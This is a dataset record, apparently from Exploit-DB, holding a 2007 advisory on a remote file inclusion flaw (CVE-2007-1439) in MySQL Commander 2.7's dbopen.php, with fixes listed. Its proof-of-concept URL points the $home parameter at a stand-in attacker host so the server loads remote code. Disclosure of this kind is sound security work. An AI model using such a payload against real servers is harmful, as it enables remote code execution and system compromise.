{
  "id": "3468",
  "title": "MySQL Commander 2.7 - &#039;home&#039; Remote File Inclusion",
  "cve": "CVE-2007-1439",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_73$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_73$2007] MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 13th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv73-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : MySQL Commander \r\nversion       : <= 2.7\r\nVendor        : http://www.bitesser.de/freeware/script.php?id=1\r\nDescription :\r\n\r\nA small tool to backup and restore MySQL Tables. Features: backup/restore of binaries; parametric backup; multiserver; Gzipping; killing of backup files; german/english; Online help in popup.\r\nThis tool makes backups of all the tables in a database. The data will be stored in textfiles located in the \"data\"directory. You can backup and restore the \"SQL create table command\" and the \"content\". So you can easily make copies of your tables. (i.e. copy a hole database with a few clicks).\r\nYou will need PHP since version 4.1 and MySQL since Version 3.23\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n- Invalid include function at ressourcen/dbopen.php :  \r\n  \t\r\n----------------ressourcen/dbopen.php-------------------\r\n<?php\r\ninclude $home.\"ressourcen/class.systemObject.php\";\r\ninclude $home.\"ressourcen/class.DatabaseMysql.php\";\r\n$db = new DatabaseMysql($config->dbuser[$_SESSION['which_db']], $config->dbpass[$_SESSION['which_db']], $config->dbserver[$_SESSION['which_db']]);\r\n$ok = $db->init();\r\n\r\nif (!$ok and $db->error and (strlen($config->dbserver[1]) > 0)) {\r\n\techo $db->getError();\r\n}\r\n\r\n?>\r\n----------------------------------------------------------------\r\n\r\n\r\nVariables $home is not properly sanitized.\r\nWhen register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/[mysqlcommander_path]/ressourcen/dbopen.php?home=http://attacker.com/evil?\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Sanitize variable $home on affected file.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-13]",
  "url": "https://www.exploit-db.com/exploits/3468"
}